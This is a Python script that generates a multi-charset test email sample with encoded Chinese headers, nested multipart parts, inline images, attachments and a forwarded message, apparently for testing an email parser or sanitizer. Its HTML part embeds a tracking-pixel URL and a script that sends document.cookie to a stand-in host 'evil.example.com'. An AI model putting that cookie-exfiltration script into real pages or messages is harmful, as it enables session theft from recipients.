"""生成多编码样例：RFC2047 编码信头、GB2312 正文、UTF-8 HTML、内联资源、
三层 multipart（mixed > alternative > related）、message/rfc822 转发、
base64 中文（RFC2047）附件名、PDF 2231 附件名、含脚本与远程资源的 HTML。

输出: tests/samples/sample_multicharset.eml
"""
from __future__ import annotations

import base64
from email.header import Header
from email.headerregistry import Address
from email.message import EmailMessage
from email.utils import formatdate, make_msgid
from pathlib import Path

OUT = Path(__file__).resolve().parent / "samples"

TINY_GIF = bytes.fromhex(
    "47494638396101000100800000000000ffffff21f90401000000002c00000000"
    "010001000002024401003b")

HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>合同</title></head>
<body>
<h1>季度报告 Q3</h1>
<p>图片: <img src="cid:logo-1@archive.example"></p>
<p>远程图片: <img src="https://img.example.com/tracker.png?user=42"></p>
<p><a href="https://files.example.com/x.pdf">外部文件</a></p>
<p>样式: <span style="background-image:url('//css.example.com/bg.png')">x</span></p>
<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>
</body></html>
"""

PLAIN = "本季度营收增长 12%，详情见附件。\n"


def _enc(value: str, charset: str) -> str:
    return Header(value, charset, maxlinelen=60).encode()


def _b64_filename(name: str, charset: str = "gb2312") -> str:
    return base64.b64encode(name.encode(charset)).decode()


def build() -> bytes:
    # related: html + 内联 GIF
    related = EmailMessage()
    related.set_content(HTML, subtype="html", charset="utf-8")
    related.make_related()
    related.add_related(TINY_GIF, maintype="image", subtype="gif",
                        cid="logo-1@archive.example", filename="logo.gif",
                        disposition="inline")

    # root: mixed；正文用 alternative(plain, related)
    root = EmailMessage()
    root["From"] = Address(display_name="张伟", addr_spec="zhang.wei@example.cn")
    root["To"] = f"{_enc('采购部 王芳', 'gb2312')} <procurement@example.cn>"
    root["Subject"] = _enc("【季度报告】Q3 合同附件", "utf-8")
    root["Message-ID"] = make_msgid("multicharset", "archive.example")
    root["Date"] = formatdate(1_789_000_000, usegmt=True)
    root["MIME-Version"] = "1.0"

    # 先放 plain 作为初始内容，再转 alternative 容器，最后追加 related
    root.set_content(PLAIN, subtype="plain", charset="gb2312")
    root.make_alternative()
    root.get_payload().append(related)

    # 普通附件：2231 编码的中文 PDF 名（add_attachment 自动处理）
    root.add_attachment(b"%PDF-1.4 fake pdf bytes\n",
                        maintype="application", subtype="pdf",
                        filename="季度合同.pdf")

    # RFC2047 B 编码的中文附件名（手工构造 Content-Disposition）
    att = EmailMessage()
    att["Content-Type"] = "application/vnd.ms-excel"
    att["Content-Transfer-Encoding"] = "base64"
    att["Content-Disposition"] = (
        'attachment; filename="=?gb2312?B?' + _b64_filename("数据明细.xls") + '?="')
    att.set_payload(base64.b64encode(b"\xd0\xcf\x11\xe0fake-xls").decode())
    root.get_payload().append(att)

    # 转发信 message/rfc822
    inner = EmailMessage()
    inner["From"] = "boss@example.cn"
    inner["To"] = "zhang.wei@example.cn"
    inner["Subject"] = "原始邮件标题"
    inner["Message-ID"] = "<inner-msg@example.cn>"
    inner["Date"] = formatdate(1_788_900_000, usegmt=True)
    inner.set_content("这是被转发的原信正文。\n", charset="utf-8")
    root.add_attachment(inner.as_bytes(), maintype="message", subtype="rfc822",
                        filename="forwarded.eml")
    return root.as_bytes()


if __name__ == "__main__":
    OUT.mkdir(parents=True, exist_ok=True)
    data = build()
    p = OUT / "sample_multicharset.eml"
    p.write_bytes(data)
    print("wrote", p, len(data), "bytes")
